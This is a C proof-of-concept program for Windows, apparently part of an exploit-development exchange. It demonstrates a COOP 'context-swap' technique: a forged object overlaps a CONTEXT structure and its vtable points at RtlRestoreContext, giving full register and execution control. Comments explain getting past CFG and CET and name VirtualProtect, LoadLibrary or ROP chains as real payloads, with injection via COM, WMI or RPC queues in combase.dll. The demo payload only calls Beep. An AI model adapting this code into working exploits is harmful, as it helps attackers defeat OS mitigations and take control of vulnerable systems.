#include <windows.h>
#include <stdio.h>

// Fox's Real COOP / Context-Swap PoC
// Jack is right. Toy loops are bullshit. RCX points to the object, so we can't just call LoadLibrary.
// We need Argument Grafting.
// The holy grail of COOP argument grafting is RtlRestoreContext.
// If we forge an object that is actually a CONTEXT structure, and point its vtable to RtlRestoreContext,
// the virtual call `obj->Dispatch()` becomes `RtlRestoreContext(&context)`.
// This instantly pivots our constrained data-loop into full register/execution control.

typedef NTSTATUS(NTAPI* fnRtlRestoreContext)(PCONTEXT ContextRecord, PEXCEPTION_RECORD ExceptionRecord);

// We need our forged object to overlap perfectly with a CONTEXT structure.
// In C++, the first 8 bytes of an object are the vtable pointer (vfptr).
// In a CONTEXT structure (AMD64), the first 8 bytes are P1Home (often unused during restore) 
// or ContextFlags. We must ensure ContextFlags is set correctly, which might conflict with the vfptr.
// Actually, ContextFlags is at offset 0x30. The first 0x30 bytes are home registers (P1Home-P6Home).
// Perfect! The vfptr sits safely in P1Home. It won't corrupt ContextFlags.

#pragma pack(push, 1)
struct ForgedComObject {
    PVOID vfptr;            // Offset 0x00 (Overlaps CONTEXT.P1Home)
    DWORD64 P2Home;         // Offset 0x08
    DWORD64 P3Home;         // Offset 0x10
    DWORD64 P4Home;         // Offset 0x18
    DWORD64 P5Home;         // Offset 0x20
    DWORD64 P6Home;         // Offset 0x28
    DWORD ContextFlags;     // Offset 0x30 - MUST BE CONTEXT_FULL (0x10000B)
    DWORD MxCsr;            // Offset 0x34
    // ... we embed the rest of the CONTEXT structure here
    // For PoC, we just use the actual CONTEXT struct and cast it.
};
#pragma pack(pop)

int main() {
    printf("[+] Starting Real COOP Context-Swap PoC.\n");

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    fnRtlRestoreContext pRtlRestoreContext = (fnRtlRestoreContext)GetProcAddress(hNtdll, "RtlRestoreContext");

    // 1. Create the fake vtable in a valid data section (or heap, depending on CFG strictness)
    // CFG validates the TARGET (RtlRestoreContext), which is a valid export.
    // IBT (CET) requires endbr64 at the target. RtlRestoreContext is an exported API, it has endbr64.
    PVOID* fakeVtable = (PVOID*)malloc(sizeof(PVOID) * 5); // Allocate a few slots
    fakeVtable[0] = pRtlRestoreContext; // Let's assume the virtual call uses offset 0
    fakeVtable[1] = pRtlRestoreContext; // Fill a few to be safe
    fakeVtable[2] = pRtlRestoreContext;

    // 2. Forge the object as a CONTEXT structure
    // We allocate a full CONTEXT structure.
    PCONTEXT pFakeObject = (PCONTEXT)VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
    RtlCaptureContext(pFakeObject); // Fill with sane defaults

    // 3. Argument Grafting: Overlap the vtable pointer
    // The C++ virtual call will do: 
    // mov rax, [rcx]       ; load vtable
    // call qword ptr [rax] ; call method
    // Since RCX is pFakeObject, the first 8 bytes must be the vtable pointer.
    // In CONTEXT, offset 0 is P1Home. We overwrite it.
    *(PVOID**)pFakeObject = fakeVtable;

    // 4. Set up the Context-Swap payload
    // When RtlRestoreContext executes, it will load RIP, RSP, RCX, etc., from this structure.
    pFakeObject->ContextFlags = CONTEXT_FULL;
    
    // Set RIP to our actual payload (e.g., VirtualProtect, LoadLibrary, or a ROP chain)
    // For PoC, we point it to a benign API to prove control.
    pFakeObject->Rip = (DWORD64)GetProcAddress(GetModuleHandleA("kernel32.dll"), "Beep");
    pFakeObject->Rcx = 750;  // Freq
    pFakeObject->Rdx = 1000; // Duration
    
    // We must provide a valid stack for the new context
    pFakeObject->Rsp = (DWORD64)VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE) + 0x800;

    printf("[+] Forged Object (CONTEXT) created at %p\n", pFakeObject);
    printf("[+] VTable points to RtlRestoreContext: %p\n", pRtlRestoreContext);
    printf("[+] Target RIP inside CONTEXT: %llX (Beep)\n", pFakeObject->Rip);

    // 5. The Trigger
    // In a real exploit, we inject pFakeObject into a COM teardown queue, 
    // WMI event queue, or RPC dispatch list inside combase.dll.
    // The OS executes:
    //   rcx = pFakeObject
    //   mov rax, [rcx]
    //   call qword ptr [rax+offset]
    
    printf("[!] Simulating the COM virtual dispatch loop...\n");
    
    // SIMULATION of the OS doing the virtual call:
    // This is what combase.dll does internally.
    PVOID* vptr = *(PVOID**)pFakeObject;
    fnRtlRestoreContext method = (fnRtlRestoreContext)vptr[0];
    
    // The OS calls it. RCX is the object.
    // This perfectly matches RtlRestoreContext(PCONTEXT ContextRecord, ...)
    method(pFakeObject, NULL);

    // We never reach here because RtlRestoreContext pivots execution to Beep.
    printf("[-] If you see this, the context swap failed.\n");

    return 0;
}